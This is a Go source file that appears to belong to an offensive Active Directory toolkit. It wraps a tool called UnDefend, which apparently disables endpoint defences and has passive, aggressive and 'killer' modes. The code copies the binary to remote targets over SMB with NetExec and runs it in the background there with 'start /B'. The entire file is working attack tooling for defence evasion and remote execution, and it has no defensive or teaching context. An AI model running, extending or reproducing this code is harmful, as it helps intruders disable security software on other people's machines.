package tools

import (
	"context"
	"adpack/utils"
	"fmt"
)

type unDefendTool struct{}

var UnDefend = unDefendTool{}

func (unDefendTool) Name() string    { return "UnDefend" }
func (unDefendTool) Available() bool {
	return utils.ToolAvailable("UnDefend.exe") || utils.ToolAvailable("UnDefend") || utils.ToolAvailable("undefend")
}

type UnDefendMode string

const (
	UnDefendPassive    UnDefendMode = "passive"
	UnDefendAggressive UnDefendMode = "aggressive"
	UnDefendKiller     UnDefendMode = "killer"
)

type UnDefendConfig struct {
	Binary string
	Mode   UnDefendMode
}

func DefaultUnDefendConfig() UnDefendConfig {
	return UnDefendConfig{
		Binary: "UnDefend.exe",
		Mode:   UnDefendPassive,
	}
}

func (u unDefendTool) Run(cfg UnDefendConfig) utils.CmdResult {
	switch cfg.Mode {
	case UnDefendPassive:
		return utils.RunCommand(cfg.Binary)
	case UnDefendAggressive:
		return utils.RunCommand(cfg.Binary, "-aggressive")
	case UnDefendKiller:
		return utils.RunCommand(cfg.Binary, "-killer")
	default:
		return utils.RunCommand(cfg.Binary)
	}
}

func (u unDefendTool) DeployViaSMB(ctx context.Context, target NetExecTarget, localPath, remoteDir string) (utils.CmdResult, error) {
	if !u.Available() {
		return utils.CmdResult{Success: false, Stderr: "UnDefend.exe not found locally"}, fmt.Errorf("UnDefend.exe not found locally")
	}
	upload, err := NetExec.PutFile(ctx, target, localPath, remoteDir)
	if err != nil {
		return upload, err
	}
	return upload, nil
}

func (u unDefendTool) ExecRemote(ctx context.Context, target NetExecTarget, remotePath string, mode UnDefendMode) (utils.CmdResult, error) {
	cmd := remotePath
	if mode == UnDefendAggressive {
		cmd += " -aggressive"
	} else if mode == UnDefendKiller {
		cmd += " -killer"
	}
	return NetExec.Run(ctx, target, "-x", []string{fmt.Sprintf(`start /B %s`, cmd)})
}
